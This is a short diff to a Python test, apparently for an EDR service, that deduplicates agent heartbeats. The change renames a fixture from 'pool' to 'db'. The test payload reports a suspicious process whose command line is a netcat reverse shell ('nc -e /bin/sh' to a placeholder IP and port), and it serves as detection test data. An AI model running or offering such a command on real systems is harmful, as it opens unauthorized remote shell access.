@@ -42,7 +42,7 @@ async def test_lote_so_com_eventos_invalidos_e_422(client, superadmin_de_teste, 
 
 
 @pytest.mark.asyncio
-async def test_heartbeat_edr_deduplicado(client, superadmin_de_teste, usuario_de_teste, pool):
+async def test_heartbeat_edr_deduplicado(client, superadmin_de_teste, usuario_de_teste, db):
     token = await _criar_agente_e_obter_token(client, superadmin_de_teste, usuario_de_teste, "host-edr-v82")
     corpo = {"hostname": "host-edr-v82", "sistema_operacional": "linux", "versao_agente": "8.2.0", "total_processos": 10,
              "processos_suspeitos": [{"pid": 4242, "nome": "nc", "usuario": "root", "linha_de_comando": "nc -e /bin/sh 1.2.3.4 4444"}]}
